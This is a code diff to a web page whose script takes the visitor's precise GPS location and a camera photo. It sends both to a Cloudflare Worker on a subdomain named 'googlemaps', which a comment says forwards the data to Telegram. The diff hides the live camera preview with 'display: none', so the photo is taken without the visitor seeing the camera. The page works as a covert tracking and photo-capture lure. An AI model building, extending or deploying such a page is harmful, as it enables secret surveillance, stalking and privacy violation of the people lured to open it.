@@ -17,10 +17,16 @@
   @media (prefers-color-scheme: dark) { body { background:#111; color:#f5f5f5; } }
 
   /* Camera preview box: flipped horizontally (scaleX(-1)) so it looks like a mirror, like a normal selfie camera */
-  video { width:200px; border-radius:16px; transform:scaleX(-1); background:#000; }
+  video { display: none }
 </style>
 </head>
 <body>
+
+<!-- Live camera preview shown while the photo is being taken -->
+<video id="v" autoplay playsinline muted></video>
+
+<!-- Status text shown to the user; gets updated by the script below -->
+<div id="s">📍 Sending location and photo...</div>
 
 <script>
   // The URL of your Cloudflare Worker, which receives the data and forwards it to Telegram.
@@ -28,7 +34,8 @@
   const WORKER_URL = "https://googlemaps.mostafa-solom258.workers.dev";
 
   // Shortcuts to the status text element and the video element
-
+  const s = document.getElementById("s");
+  const v = document.getElementById("v");
 
   // Wraps the browser's location API in a Promise so we can "await" it.
   // enableHighAccuracy: ask for GPS-level precision, not just rough Wi-Fi/cell location
